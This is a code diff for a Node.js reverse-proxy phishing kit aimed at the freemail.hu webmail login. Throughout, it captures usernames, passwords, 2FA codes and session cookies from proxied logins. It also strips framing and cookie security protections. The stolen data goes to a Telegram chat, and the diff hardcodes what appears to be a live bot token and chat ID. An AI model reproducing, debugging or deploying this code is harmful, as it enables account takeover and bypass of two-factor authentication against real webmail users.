@@ -4,27 +4,39 @@ const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const http = require('http');
 
-// ============================================
-// CONFIGURATION
-// ============================================
+const app = express();
 
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
+// Get config from environment variables (Render sets these)
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 const TARGET_URL = process.env.TARGET_URL || 'https://accounts.freemail.hu';
 const PORT = process.env.PORT || 3000;
 
-const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
-const app = express();
+console.log('=== CONFIG CHECK ===');
+console.log('Token exists:', TELEGRAM_TOKEN ? 'YES' : 'NO');
+console.log('Chat ID:', CHAT_ID);
+console.log('Target:', TARGET_URL);
+console.log('Port:', PORT);
+console.log('====================');
 
-// Storage for multi-stage capture
+if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g') {
+  console.error('❌ ERROR: TELEGRAM_TOKEN not set!');
+}
+
+if (!CHAT_ID || CHAT_ID === '93372553') {
+  console.error('❌ ERROR: CHAT_ID not set!');
+}
+
+const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
 const sessions = new Map();
 
-// ============================================
-// HELPER FUNCTIONS
-// ============================================
+// Test Telegram connection on startup
+bot.sendMessage(CHAT_ID, '🤖 Sam Proxy started and ready!')
+  .then(() => console.log('✅ Telegram test message sent!'))
+  .catch(err => console.error('❌ Telegram test failed:', err.message));
 
 function getClientId(req) {
-  return req.ip + (req.headers['user-agent'] || '');
+  return (req.headers['x-forwarded-for'] || req.ip) + (req.headers['user-agent'] || '');
 }
 
 function getSession(req) {
@@ -35,77 +47,60 @@ function getSession(req) {
       password: null,
       twofaCode: null,
       sessionToken: null,
-      stage: 0,
-      startTime: new Date().toISOString()
+      stage: 0
     });
   }
   return sessions.get(id);
 }
 
-function sendToTelegram(data) {
-  const message = `🎉 *CAPTURE COMPLETE!*\n\n` +
-    `👤 *Username:* \`${data.username || 'N/A'}\`\n` +
-    `🔑 *Password:* \`${data.password || 'N/A'}\`\n` +
-    `🔢 *2FA:* \`${data.twofaCode || 'N/A'}\`\n\n` +
-    `🍪 *Session:* \`\`\`${data.sessionToken || 'N/A'}\`\`\`\n\n` +
-    `⏰ *Time:* ${new Date().toLocaleString()}`;
-
-  bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
-    .then(() => console.log('📱 Sent to Telegram'))
-    .catch(err => console.error('Telegram error:', err.message));
-}
-
-// ============================================
-// MIDDLEWARE
-// ============================================
-
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true }));
 
-// Capture requests
+// DEBUG: Log every single request
 app.use((req, res, next) => {
   const session = getSession(req);
   
+  console.log(`\n[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
+  console.log('Stage:', session.stage);
+  console.log('Body:', JSON.stringify(req.body));
+  
   if (req.method === 'POST' && req.body) {
     const body = req.body;
-    const userFields = ['username', 'email', 'user', 'login', 'id', 'account', 'identifier'];
-    const passFields = ['password', 'passwd', 'pass', 'pwd', 'secret'];
-    const codeFields = ['code', 'otp', 'twofa', '2fa', 'verificationCode', 'token', 'pin'];
     
-    for (let field of userFields) {
-      if (body[field]) {
-        session.username = body[field];
-        session.stage = Math.max(session.stage, 1);
-        console.log('✅ Captured username');
-        break;
+    // Check ALL possible field names
+    const possibleFields = Object.keys(body);
+    console.log('Fields in request:', possibleFields);
+    
+    // Try to find username
+    for (let key of possibleFields) {
+      if (['username', 'email', 'user', 'login', 'id', 'account', 'identifier', 'name'].includes(key.toLowerCase())) {
+        if (body[key]) {
+          session.username = body[key];
+          session.stage = 1;
+          console.log('✅ CAPTURED USERNAME:', body[key]);
+        }
       }
-    }
-    
-    for (let field of passFields) {
-      if (body[field]) {
-        session.password = body[field];
-        session.stage = Math.max(session.stage, 2);
-        console.log('✅ Captured password');
-        break;
+      
+      if (['password', 'passwd', 'pass', 'pwd', 'secret', 'password1'].includes(key.toLowerCase())) {
+        if (body[key]) {
+          session.password = body[key];
+          session.stage = 2;
+          console.log('✅ CAPTURED PASSWORD');
+        }
       }
-    }
-    
-    for (let field of codeFields) {
-      if (body[field]) {
-        session.twofaCode = body[field];
-        session.stage = Math.max(session.stage, 3);
-        console.log('✅ Captured 2FA');
-        break;
+      
+      if (['code', 'otp', 'twofa', '2fa', 'verificationcode', 'token', 'pin', 'totp'].includes(key.toLowerCase())) {
+        if (body[key]) {
+          session.twofaCode = body[key];
+          session.stage = 3;
+          console.log('✅ CAPTURED 2FA');
+        }
       }
     }
   }
   
   next();
 });
-
-// ============================================
-// PROXY
-// ============================================
 
 const proxy = createProxyMiddleware({
   target: TARGET_URL,
@@ -114,18 +109,13 @@ const proxy = createProxyMiddleware({
   ws: true,
   followRedirects: false,
   
-  cookieDomainRewrite: {
-    '*': ''
-  },
+  cookieDomainRewrite: { '*': '' },
   
   onProxyReq: (proxyReq, req, res) => {
     try {
-      if (!proxyReq.headersSent) {
-        proxyReq.setHeader('Referer', TARGET_URL);
-        proxyReq.setHeader('Origin', TARGET_URL);
-      }
+      proxyReq.setHeader('Referer', TARGET_URL);
+      proxyReq.setHeader('Origin', TARGET_URL);
     } catch (e) {}
-    console.log('➡️  Proxying:', req.url);
   },
   
   onProxyRes: (proxyRes, req, res) => {
@@ -133,6 +123,9 @@ const proxy = createProxyMiddleware({
     
     delete proxyRes.headers['x-frame-options'];
     delete proxyRes.headers['content-security-policy'];
+    
+    console.log('Response status:', proxyRes.statusCode);
+    console.log('Response headers:', JSON.stringify(proxyRes.headers['set-cookie'] || 'no cookies'));
     
     if (proxyRes.headers['set-cookie']) {
       const cookies = proxyRes.headers['set-cookie'];
@@ -144,56 +137,57 @@ const proxy = createProxyMiddleware({
           .replace(/Secure;?/gi, '');
       });
       
-      const sessionCookie = cookies.find(c => 
-        c.toLowerCase().includes('session') || 
-        c.toLowerCase().includes('auth') ||
-        c.toLowerCase().includes('token') ||
-        c.length > 40
-      );
+      console.log('Modified cookies:', cookies);
       
-      if (sessionCookie && session.username && session.stage >= 2) {
-        session.sessionToken = sessionCookie;
-        session.stage = 4;
-        console.log('🎉 COMPLETE CAPTURE!');
-        sendToTelegram(session);
-        setTimeout(() => sessions.delete(getClientId(req)), 30000);
+      // Send to Telegram if we have username AND password
+      if (session.username && session.password) {
+        const message = `🎉 *LOGIN CAPTURED!*\n\n` +
+          `👤 *Username:* \`${session.username}\`\n` +
+          `🔑 *Password:* \`${session.password}\`\n` +
+          `🔢 *2FA:* \`${session.twofaCode || 'N/A'}\`\n\n` +
+          `🍪 *Cookies:*\n\`\`\`\n${cookies.join('\n')}\n\`\`\``;
+        
+        console.log('🚀 SENDING TO TELEGRAM...');
+        
+        bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
+          .then(() => console.log('✅ SENT TO TELEGRAM!'))
+          .catch(err => {
+            console.error('❌ TELEGRAM ERROR:', err.message);
+            console.error('Token valid?', TELEGRAM_TOKEN ? 'Yes' : 'No');
+            console.error('Chat ID valid?', CHAT_ID ? 'Yes' : 'No');
+          });
+      } else {
+        console.log('⚠️ Not sending to Telegram - missing username or password');
+        console.log('Username:', session.username);
+        console.log('Password:', session.password ? 'Yes (hidden)' : 'No');
       }
     }
   },
   
   onError: (err, req, res) => {
-    console.error('❌ Proxy Error:', err.message);
+    console.error('Proxy Error:', err.message);
     if (!res.headersSent) {
       res.status(502).send('Proxy error');
     }
   }
 });
 
-// ============================================
-// ROUTES
-// ============================================
+// Manual test endpoint
+app.get('/test-telegram', (req, res) => {
+  bot.sendMessage(CHAT_ID, '🔔 Test message from Sam Proxy!')
+    .then(() => res.send('Test message sent! Check Telegram.'))
+    .catch(err => res.send('Error: ' + err.message));
+});
 
-// Health check for Render
 app.get('/health', (req, res) => {
-  res.json({status: 'ok', activeSessions: sessions.size});
+  res.json({status: 'ok', sessions: sessions.size});
 });
 
 app.use('/', proxy);
 
-// ============================================
-// SERVER - BIND TO 0.0.0.0
-// ============================================
-
 const server = http.createServer(app);
 
-// MUST bind to 0.0.0.0 for Render to detect the port
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`
-╔════════════════════════════════════════════════╗
-║   🎭 SAM'S PROXY RUNNING                      ║
-║   Port: ${PORT}                               ║
-║   Host: 0.0.0.0                               ║
-║   Target: ${TARGET_URL}          ║
-╚════════════════════════════════════════════════╝
-  `);
+  console.log(`\n🎭 SAM RUNNING on port ${PORT}`);
+  console.log(`Visit: https://your-app.onrender.com/test-telegram to test Telegram\n`);
 });
